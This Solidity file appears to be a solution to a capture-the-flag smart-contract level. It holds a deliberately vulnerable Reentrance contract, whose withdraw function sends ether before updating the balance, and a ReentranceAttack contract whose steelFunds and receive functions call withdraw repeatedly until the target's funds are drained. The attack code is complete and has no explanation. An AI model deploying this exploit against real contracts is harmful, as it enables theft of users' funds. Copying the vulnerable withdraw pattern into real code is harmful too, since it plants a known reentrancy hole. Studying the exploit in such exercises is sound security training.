// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import 'openzeppelin-contracts-06/math/SafeMath.sol';

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.1/contracts/math/SafeMath.sol";

contract Reentrance {
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if (balances[msg.sender] >= _amount) {
      (bool result, ) = msg.sender.call{value: _amount}("");
      if (result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentranceAttack {
  Reentrance public ctr;
  uint256 amount = 1 finney;

  constructor(Reentrance _ctr) public payable {
    ctr = _ctr;
  }

  function steelFunds() public payable {
    uint256 balance = address(ctr).balance;
    ctr.donate{value: msg.value}(address(this));
    if (balance > 0) {
      ctr.withdraw(amount);
    }
  }

  receive() external payable {
    uint256 balance = address(ctr).balance;
    if (balance > 0) {
      ctr.withdraw(amount);
    }
  }
}
